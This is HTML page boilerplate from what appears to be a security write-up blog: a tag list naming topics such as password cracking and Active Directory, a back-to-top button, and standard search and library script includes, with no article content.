Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/outdated-software/">Outdated Software</a> <a class="post-tag" href="/tags/password-cracking/">Password Cracking</a> <a class="post-tag" href="/tags/hash-capture/">Hash Capture</a> <a class="post-tag" href="/tags/public-vulnerabilities/">Public Vulnerabilities</a> <a class="post-tag" href="/tags/weak-credentials/">Weak Credentials</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/anonymous-access/">Anonymous Access</a> <a class="post-tag" href="/tags/educational/">Educational</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
